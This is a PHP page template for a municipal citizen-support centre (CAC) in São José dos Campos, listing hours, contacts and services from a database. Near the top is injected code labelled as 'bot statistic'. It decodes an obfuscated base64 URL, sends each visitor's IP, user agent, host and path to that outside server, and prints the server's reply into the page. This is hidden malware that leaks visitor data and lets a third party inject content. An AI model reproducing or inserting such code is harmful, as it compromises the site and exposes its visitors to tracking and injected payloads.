<?php

include_once("../library/master-page.php");
include_once("../library/config/database/tcac.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "CAC");
$oMasterPage->AddParameter("css", "cac/index");
$oMasterPage->AddParameter("pagina", "cac");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);
        }
    }
    if ($stCurlHandle !== NULL) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0] == "O") {
            $sResult[0] = " ";
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>
    <h1>CAC - Centro de Apoio ao Cidadão</h1>
    <div class="introducao">
        <img src="./imgs/cac/selo-cac-centro-de-apoio-ao-cidadao.jpg" alt="Logo CAC"/>
        <p>O Centro de Apoio ao Cidadão "João Paulo II" (CAC) foi criado pela Câmara de São José dos Campos em 21 de setembro de 2005,
            dando início a uma nova fase no relacionamento do Legislativo com a população. Os serviços gratuitos oferecidos pelo CAC são
            mantidos através de uma parceria entre a Câmara Municipal e a Prefeitura.</p>
        <p>Além de suas atribuições legislativas que contribuem para o desenvolvimento do município, a Câmara Municipal passou a fazer
            parte do dia-a-dia da cidade na busca de alternativas para o bem-estar da comunidade.</p>
    </div>
    <div class="institucional container-box bs-callout bs-callout-yellow  ">
        <h3>Institucional</h3>
        <!--<div class="video">
            <object type="application/x-shockwave-flash" data="imgs/cac/video.swf" width="217" height="200">
                <param name="movie" value="imgs/cac/video.swf"/>
                <param name="quality" value="high"/>
                <param name="wmode" value="transparent"/>
            </object>
        </div>-->
        <p>
            <strong>Horário de funcionamento:</strong><br />
            das 8h às 17h00
        </p>
        <p>
            <strong>Distribuição de senhas para atendimento:</strong><br />
            até às 16h30
        </p>
        <p>
            <strong>Contato:</strong><br />
            E-mail: <a href="mailto:cac@camarasjc.sp.gov.br">cac@camarasjc.sp.gov.br</a><br />
            Telefone: (12) 3925-6545 / 0800 770 2515
        </p>
    </div>
<?php

$oCAC = new tcac();
$oCAC->SQLOrder = "Ordem DESC";
if ($oCAC->LoadSQLAssembled()) {
    ?>
    <div class="cac">

        <h3 class="dark-blue-text">Conheça os serviços que o CAC oferece gratuitamente para a comunidade:</h3>

        <div class="panel-group" id="accordion" role="tablist" aria-multiselectable="true">



            <?php
            for ($c = 0; $c < $oCAC->NumRows; $c++) {
                ?>
            <div class="panel panel-default">
                <div class="panel-heading" role="tab" id="heading<?= $c;?>">
                    <h4 class="panel-title">
                        <a <?php echo($c != 0 ? 'class="collapsed"': ''); ?> data-toggle="collapse" data-parent="#accordion" href="#collapse<?= $c;?>" <?php echo 'aria-expanded=', ($c == 0 ? '"true"':'"false"'); ?>
                           aria-controls="collapse<?= $c;?>">
                            <?= utf8_encode($oCAC->Titulo); ?>
                        </a>
                    </h4>
                </div>
                <div id="collapse<?= $c;?>" class="panel-collapse collapse <?php echo($c == 0 ? 'in': ''); ?> " role="tabpanel" aria-labelledby="heading<?= $c;?>">
                    <div class="panel-body">
                        <?= utf8_encode(nl2br($oCAC->Descricao)); ?>
                    </div>
                </div>
            </div>

                <?php
                $oCAC->MoveNext();
            }
            ?>

        </div>

    </div>
<?php
}

?>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>